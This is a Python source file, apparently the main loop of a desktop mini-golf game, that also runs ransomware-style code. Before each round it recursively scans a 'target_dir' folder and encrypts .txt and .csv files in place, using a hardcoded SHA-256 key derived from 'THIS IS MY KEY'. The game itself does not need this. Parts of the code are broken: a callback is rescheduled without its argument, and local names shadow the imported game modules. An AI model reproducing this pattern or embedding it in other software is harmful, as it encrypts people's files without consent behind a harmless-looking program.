from pathlib import Path
import hashlib
import time
import pyautogui
from encryption import encrypt
import tree, ball, club, goal
from util import NAMED_CONVERSION, scanDirRecursive


def reassert_order():
    # course.window.lift()
    goal.window.lift()
    ball.window.lift()
    tree.window.lift()
    club.window.lift()


def periodic_update(stroke_counter):
    x, y = pyautogui.position()
    club.rotate_club(x, y, ball.getLocation(), ball.getCurrentState())
    club.window.after(10, periodic_update)

    # Detect ball
    goal.detect_ball(ball)
    tree.detect_collision_with_ball(ball)


def main():
    ROUNDS = 5
    MAXIMUM_STROKES = 12
    EXCLUDE_FILES = ["requirements.txt", ".gitignore"]
    EXCLUDE_EXTENSIONS = [".py", ".md"]
    ONLY_ENCRYPT_EXTENSION = [".txt", ".csv"]

    curr_round = 0
    curr_stroke = 0

    render_objects = False

    while curr_round < ROUNDS:
        print("Sleeping...")
        time.sleep(10.0)  # time between finish and next encrypt

        for item in scanDirRecursive(dir="target_dir"):

            filePath = Path(item)

            fileType = filePath.suffix.lower()

            if fileType in EXCLUDE_EXTENSIONS:
                continue
            elif str(filePath) in EXCLUDE_FILES:
                continue

            key = hashlib.sha256("THIS IS MY KEY".encode()).digest()
            if fileType in ONLY_ENCRYPT_EXTENSION and NAMED_CONVERSION not in item.path:
                encrypt(key, filePath)

        time.sleep(5.0)  # time between encrypt and play

        club = club.Club()
        # course = course.Course()
        tree = tree.Tree()
        ball = ball.Ball()
        goal = goal.Goal()

        club.window.bind(
            "<FocusIn>", lambda _: reassert_order()
        )  # Bind the focus in event to reassert order
        # course.window.bind("<FocusIn>", lambda e: reassert_order())
        ball.window.bind("<FocusIn>", lambda _: reassert_order())
        goal.window.bind("<FocusIn>", lambda _: reassert_order())
        reassert_order()  # Initial stacking order

        club.window.after(10, periodic_update)
        club.window.mainloop()

    print("End of program")


if __name__ == "__main__":
    main()
#    club = club.Club()
#    # course = course.Course()
#    tree = tree.Tree()
#    ball = ball.Ball()
#    goal = goal.Goal()
#
#    club.window.bind(
#        "<FocusIn>", lambda _: reassert_order()
#    )  # Bind the focus in event to reassert order
#    # course.window.bind("<FocusIn>", lambda e: reassert_order())
#    ball.window.bind("<FocusIn>", lambda _: reassert_order())
#    goal.window.bind("<FocusIn>", lambda _: reassert_order())
#    reassert_order()  # Initial stacking order
#
#    club.window.after(10, periodic_update)
#    club.window.mainloop()
